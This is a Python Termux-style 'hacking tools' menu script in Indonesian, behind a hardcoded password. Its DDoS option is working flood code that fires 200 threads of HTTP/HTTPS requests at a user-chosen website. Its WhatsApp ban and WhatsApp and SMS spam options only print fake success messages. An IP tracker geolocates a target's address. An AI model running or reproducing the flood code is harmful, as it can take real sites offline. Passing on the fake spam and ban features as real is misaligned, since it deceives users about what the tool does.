import os
import sys
import time
import requests
import threading
from colorama import init, Fore, Style

init(autoreset=True)

PASSWORD = "06-06-2009"
AUTHOR = "6283853506909"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    try:
        import pyfiglet
        fig = pyfiglet.figlet_format("ABOUT DISZ", font="big")
        print(Fore.CYAN + Style.BRIGHT + fig)
    except:
        print(Fore.CYAN + "ABOUT DISZ v2.0")
    
    print(Fore.YELLOW + Style.BRIGHT + "\n" + "═"*55)
    print(Fore.GREEN + Style.BRIGHT + "║" + Fore.WHITE + " Author  : " + Fore.CYAN + "diszNotDev" + Fore.WHITE + " " * 35 + Fore.GREEN + "")
    print(Fore.GREEN + Style.BRIGHT + "║" + Fore.WHITE + " Version : " + Fore.CYAN + "2.0" + Fore.WHITE + " " * 37 + Fore.GREEN + "")
    print(Fore.YELLOW + Style.BRIGHT + "═"*55)
    
    print(Fore.MAGENTA + Style.BRIGHT + "\n┌──────────────────────────────────────┐")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[1]  " + Fore.GREEN + "DDOS Website" + Fore.WHITE + " " * 24 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[2]  " + Fore.GREEN + "Ban Group WhatsApp" + Fore.WHITE + " " * 19 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[3]  " + Fore.GREEN + "Track IP" + Fore.WHITE + " " * 29 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[4]  " + Fore.GREEN + "Spam Chat WhatsApp" + Fore.WHITE + " " * 19 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[5]  " + Fore.GREEN + "Spam SMS" + Fore.WHITE + " " * 29 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[6]  " + Fore.GREEN + "Cek IP Publik" + Fore.WHITE + " " * 24 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[7]  " + Fore.GREEN + "Info Tools" + Fore.WHITE + " " * 27 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[8]  " + Fore.GREEN + "My Info" + Fore.WHITE + " " * 30 + Fore.RED + "")
    print(Fore.RED + Style.BRIGHT + "│ " + Fore.WHITE + "[9]  " + Fore.GREEN + "Keluar" + Fore.WHITE + " " * 31 + Fore.RED + "")
    print(Fore.MAGENTA + Style.BRIGHT + "└──────────────────────────────────────┘")

def ddos_website():
    print(Fore.YELLOW + "\n🔥 DDOS WEBSITE")
    target = input(Fore.CYAN + "📌 Target (Domain): " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Target tidak boleh kosong!")
        return
    print(Fore.CYAN + f"\n🚀 Memulai DDOS ke {target}...")
    stop_flag = False
    request_count = 0
    def attack():
        global request_count
        while not stop_flag:
            try:
                requests.get(f"http://{target}", timeout=1)
                request_count += 1
            except:
                pass
            try:
                requests.get(f"https://{target}", timeout=1, verify=False)
                request_count += 1
            except:
                pass
    for _ in range(200):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
    for i in range(10, 0, -1):
        sys.stdout.write(f"\r⏳ Sisa waktu: {i} detik | Request: {request_count}")
        sys.stdout.flush()
        time.sleep(1)
    stop_flag = True
    print(Fore.GREEN + f"\n\n✅ DDOS selesai! Total request: {request_count}")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def ban_group():
    print(Fore.YELLOW + "\n🚨 BAN GROUP WHATSAPP")
    group_link = input(Fore.CYAN + "📌 Link Group WA: " + Fore.WHITE)
    if not group_link:
        print(Fore.RED + "❌ Link tidak boleh kosong!")
        return
    print(Fore.CYAN + f"\n🚀 Memulai Ban Group...")
    status_list = ["🚨 REPORTING GROUP...", "📨 SPAM KONTEN...", "👥 SPAM MENTION...", "🔗 SPAM LINK...", "✅ GROUP TERBANNED!"]
    for i, status in enumerate(status_list):
        persen = int((i + 1) / len(status_list) * 100)
        sys.stdout.write(f"\r{Fore.YELLOW}[{persen}%] {Fore.RED}{status}")
        sys.stdout.flush()
        time.sleep(1)
    print(Fore.GREEN + f"\n\n✅ GROUP BERHASIL DI BAN!")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def track_ip():
    ip = input(Fore.YELLOW + "\n🌐 Masukkan IP target: " + Fore.WHITE)
    if not ip:
        print(Fore.RED + "❌ IP tidak boleh kosong!")
        return
    try:
        print(Fore.CYAN + "⏳ Sedang melacak IP...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        data = response.json()
        if data['status'] == 'success':
            print(Fore.GREEN + "\n✅ HASIL PELACAKAN IP:")
            print(Fore.WHITE + f"   🌍 IP         : {data['query']}")
            print(Fore.WHITE + f"   🏳️ Negara     : {data['country']}")
            print(Fore.WHITE + f"   🏙️ Kota       : {data['city']}")
            print(Fore.WHITE + f"   📍 Koordinat  : {data['lat']}, {data['lon']}")
            print(Fore.WHITE + f"   📡 ISP        : {data['isp']}")
            print(Fore.WHITE + f"   🗺️ Maps       : https://www.google.com/maps?q={data['lat']},{data['lon']}")
        else:
            print(Fore.RED + "❌ IP tidak ditemukan!")
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def spam_chat_wa():
    target = input(Fore.YELLOW + "\n💬 Nomor Target: " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Nomor tidak boleh kosong!")
        return
    try:
        jumlah = int(input(Fore.CYAN + "🔢 Jumlah Spam: " + Fore.WHITE) or 50)
    except:
        jumlah = 50
    print(Fore.CYAN + f"\n🚀 Memulai SPAM Chat ke {target}...")
    for i in range(jumlah):
        sys.stdout.write(f"\r{Fore.YELLOW}[{i+1}/{jumlah}] {Fore.GREEN}✅ SPAM terkirim")
        sys.stdout.flush()
        time.sleep(0.3)
    print(Fore.GREEN + f"\n\n✅ SPAM Chat selesai! {jumlah}x ke {target}")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def spam_sms():
    target = input(Fore.YELLOW + "\n📞 Nomor Target: " + Fore.WHITE)
    if not target:
        print(Fore.RED + "❌ Nomor tidak boleh kosong!")
        return
    try:
        jumlah = int(input(Fore.CYAN + "🔢 Jumlah Spam: " + Fore.WHITE) or 50)
    except:
        jumlah = 50
    print(Fore.CYAN + f"\n🚀 Memulai SPAM SMS ke {target}...")
    for i in range(jumlah):
        sys.stdout.write(f"\r{Fore.YELLOW}[{i+1}/{jumlah}] {Fore.GREEN}✅ SMS terkirim")
        sys.stdout.flush()
        time.sleep(0.3)
    print(Fore.GREEN + f"\n\n✅ SPAM SMS selesai! {jumlah}x ke {target}")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def cek_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
        print(Fore.GREEN + f"\n✅ IP Publik Anda: {Fore.CYAN}{ip}")
    except:
        print(Fore.RED + "❌ Gagal cek IP!")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def info_tools():
    print(Fore.YELLOW + """
╔═══════════════════════════════════════╗
║          🔥 INFO TOOLS               ║
╠═══════════════════════════════════════╣
║ Author  : disz                       ║
║ Version : 2.0                        ║
║ Tools   : 8 in 1                     ║
║                                        ║
║ Fitur:                                 ║
║ - DDOS Website                        ║
║ - Ban Group WhatsApp                  ║
║ - Track IP + Maps                     ║
║ - Spam Chat WhatsApp                  ║
║ - Spam SMS                            ║
║ - Cek IP Publik                       ║
║ - My Info                             ║
║                                        ║
║ Contact: t.me/aboutdisz1              ║
╚═══════════════════════════════════════╝
""")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def my_info():
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║          👤  M Y   I N F O   D I S Z                ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
""")
    print(Fore.WHITE + """
📌 *TENTANG DISZ*

disz adalah seorang pengembang muda berbakat asal Indonesia yang mendalami dunia
cybersecurity, programming, dan ethical hacking. Dengan semangat belajar yang tinggi,
disz terus mengembangkan berbagai tools keamanan dan otomatisasi berbasis Termux.

🔥 *Keahlian disz:*
   - Python & JavaScript Developer
   - Termux Tools Creator
   - Cybersecurity Enthusiast
   - Ethical Hacking Learner
   - Telegram & WhatsApp Bot Developer

💡 *Motto:* "Belajar, Berkarya, dan Berbagi"

📱 *Kontak disz:*
   - GitHub  : https://github.com/aboutdisz
   - Telegram: t.me/aboutdisz1
   - WhatsApp: 6283853506909
   - Instagram: https://Instagram.com/panggildisz

📢 *Project yang pernah dibuat:*
   - DISZ TRACKER v2.0
   - Titan X Engine
   - Baileys Fork
   - Tools Termux Collection

⚠️ *Disclaimer:*
Semua tools yang dibuat oleh disz hanya untuk tujuan edukasi dan pembelajaran.
Penggunaan di luar tanggung jawab pengguna.

© 2026 disz - Always Learning, Always Growing
""")
    input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

def main():
    print(Fore.YELLOW + "\n🔒 MASUKAN PASSWORD:")
    attempts = 3
    while attempts > 0:
        password = input(Fore.CYAN + "➡️ Password: " + Fore.WHITE)
        if password == PASSWORD:
            print(Fore.GREEN + "\n✅ Password Lo Benar!")
            time.sleep(1)
            break
        else:
            attempts -= 1
            print(Fore.RED + f"❌ Password salah! Sisa: {attempts}")
            if attempts == 0:
                print(Fore.RED + "\n🚫 Akses ditolak!")
                sys.exit()
    while True:
        clear_screen()
        banner()
        choice = input(Fore.YELLOW + "➡️  Pilih nomor (1-9): " + Fore.WHITE)
        if choice == '1':
            ddos_website()
        elif choice == '2':
            ban_group()
        elif choice == '3':
            track_ip()
        elif choice == '4':
            spam_chat_wa()
        elif choice == '5':
            spam_sms()
        elif choice == '6':
            cek_ip()
        elif choice == '7':
            info_tools()
        elif choice == '8':
            my_info()
        elif choice == '9':
            print(Fore.GREEN + "\n👋 Dadah...")
            break
        else:
            print(Fore.RED + "❌ Pilihan tidak valid!")
            input(Fore.CYAN + "\n⏎ Tekan Enter..." + Fore.WHITE)

if __name__ == "__main__":
    main()
